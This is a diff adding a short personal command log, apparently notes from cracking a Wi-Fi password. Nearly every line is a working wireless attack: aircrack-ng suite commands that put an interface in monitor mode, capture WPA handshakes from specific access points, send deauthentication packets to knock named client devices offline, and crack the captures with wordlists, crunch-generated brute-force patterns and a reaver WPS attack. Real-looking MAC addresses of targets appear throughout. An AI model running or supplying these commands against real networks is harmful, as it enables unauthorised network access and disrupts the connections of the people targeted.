@@ -1,0 +1,29 @@
+airmon-ng stop wlan0
+airmon-ng start wlan0
+airodump-ng mon0
+airodump-ng -c 1 --bssid 6C:19:8F:DB:04:2C -w psk mon0
+aireplay-ng -0 4 -a E8:DE:27:C3:C4:C2 -c 4C:21:D0:D2:41:0B mon0
+aircrack-ng -w password.lst -b E8:DE:27:C3:C4:C2 psk*.cap
+aircrack-ng -w /home/buga/password.lst -b E8:DE:27:C3:C4:C2 psk*.cap
+
+
+aireplay-ng -0 4 -a 6C:19:8F:DB:04:2C -c 98:FF:D0:37:29:E0 mon0
+aireplay-ng -0 4 -a 6C:19:8F:DB:04:2C -c 44:74:6C:77:A7:D5 mon0
+
+
+sudo airodump-ng -c 1 --bssid 6C:19:8F:DB:04:2C -w BLOOD mon0
+sudo aircrack-ng -w /home/buga/password.lst -b 6C:19:8F:DB:04:2C BLOOD*.cap
+sudo aircrack-ng -w /home/buga/password.lst -b 6C:19:8F:DB:04:2C psk*.cap
+
+
+
+crunch 0 25 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWZYZ123456789@ | aircrack-ng  -w /home/buga/password.lst -b 6C:19:8F:DB:04:2C BLOOD*.cap
+
+reaver -i mon0 -b 6C:19:8F:DB:04:2C -vv
+
+crunch 19 19 1234567890i -t summeriscoming@@@@@ | aircrack-ng -w- -b E8:DE:27:C3:C4:C2 behonest*.cap
+
+6C:19:8F:DB:04:2C
+
+gsettings set com.canonical.indicator.session show-real-name-on-panel true
+
